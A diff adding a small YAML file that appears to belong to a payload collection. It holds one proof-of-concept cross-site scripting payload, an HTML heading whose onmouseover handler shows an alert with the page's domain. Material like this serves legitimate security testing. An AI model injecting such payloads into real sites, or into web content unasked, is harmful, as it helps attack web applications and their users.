@@ -1,0 +1,8 @@
+metadata:
+  filename: "xxs-heading-mouseover-poc-alert.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  <h1 onmouseover="alert(document.domain)">XSS HOVER TEST</h1>
